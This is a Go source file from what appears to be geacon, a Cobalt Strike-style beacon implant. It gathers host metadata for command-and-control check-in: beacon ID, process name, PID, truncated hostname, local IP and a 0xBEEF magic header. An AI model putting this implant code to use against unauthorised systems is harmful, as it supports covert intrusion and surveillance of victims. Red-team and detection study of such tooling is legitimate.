package sysinfo

import (
	"encoding/binary"
	"geacon/cmd/crypt"
	"net"
	"os"
	"runtime"
	"strings"
)

func GeaconID() int {
	randomInt := crypt.RandomInt(100000, 999998)
	if randomInt%2 == 0 {
		return randomInt
	} else {
		return randomInt + 1
	}
}

func GetProcessName() string {
	processName := os.Args[0]
	if len(processName) > 10 {
		processName = processName[len(processName)-9:]
	}
	return strings.ReplaceAll(strings.ReplaceAll(processName, "./", ""), "/", "")
}

func GetPID() int {
	return os.Getpid()
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size
	if len(sHostName) > 10 {
		sHostName = sHostName[1 : 10-1]
	}
	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	return sHostName
}

func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func GetMagicHead() []byte {
	MagicNum := 0xBEEF
	MagicNumBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(MagicNumBytes, uint32(MagicNum))
	return MagicNumBytes
}
